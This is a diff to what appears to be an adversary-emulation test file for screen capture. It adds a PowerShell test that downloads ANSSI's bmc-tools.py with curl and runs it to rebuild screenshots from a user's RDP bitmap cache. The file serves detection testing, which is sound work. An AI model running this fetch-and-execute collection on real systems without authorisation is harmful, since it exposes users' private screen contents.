@@ -96,7 +96,6 @@ atomic_tests:
     cleanup_command: |
       rm #{output_file}
     name: sh
-
 - name: Capture Linux Desktop using Import Tool
   auto_generated_guid: 9cd1cccb-91e4-4550-9139-e20a586fcea1
   description: |
@@ -174,7 +173,6 @@ atomic_tests:
   auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
   description: |
     Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
-
     [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
   supported_platforms:
   - windows
@@ -210,3 +208,44 @@ atomic_tests:
       reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f
     name: powershell
     elevation_required: true
+- name: RDP Bitmap Cache Extraction via bmc-tools
+  description: |
+    Simulates an attacker extracting the RDP bitmap cache using the ANSSI "bmc-tools.py" script.
+    This test requires valid RDP bitmap cache files to exist on the system (usually created after an outgoing RDP connection is made).
+  supported_platforms:
+  - windows
+  input_arguments:
+    cache_path:
+      description: Path to the RDP Cache directory or specific .bmc file
+      type: path
+      default: $env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache
+    output_dir:
+      description: Directory to save reconstructed images
+      type: path
+      default: $env:TEMP\rdp_screens
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Python must be installed and in the PATH to run bmc-tools.py
+    prereq_command: |
+      if (Get-Command python -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      Write-Host "Please install Python manually."
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'
+      $toolsDir = "$env:TEMP\bmc-tools.py"
+       
+      # create output directory
+      New-Item -ItemType Directory -Path #{output_dir} -Force | Out-Null
+
+      # python script download
+      & curl.exe -L $url --output $toolsDir
+       
+      # execution step
+      if (Test-Path $toolsDir) { python $toolsDir -s "#{cache_path}" -d #{output_dir} -b }
+    cleanup_command: |
+      Remove-Item "$env:TEMP\bmc-tools.py" -ErrorAction SilentlyContinue
+      Remove-Item #{output_dir} -Recurse -Force -ErrorAction SilentlyContinue
